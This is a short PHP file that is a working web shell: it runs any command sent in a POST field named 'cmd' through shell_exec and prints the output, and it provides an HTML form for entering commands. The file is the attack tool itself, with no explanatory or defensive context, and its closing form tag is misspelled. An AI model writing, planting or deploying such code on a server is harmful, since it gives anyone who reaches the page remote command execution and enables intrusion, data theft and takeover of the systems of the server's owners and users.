<?php
if(isset($_POST['cmd'])){
    $cmd = $_POST['cmd'];
   $result = shell_exec($cmd);
    echo "<pre>" .$result. "</pre>";
}
?>
<form method = "post">
    <p>Command: <input type = "text" name = "cmd"></p>
    <input type = "submit" value = "Execute">
</from>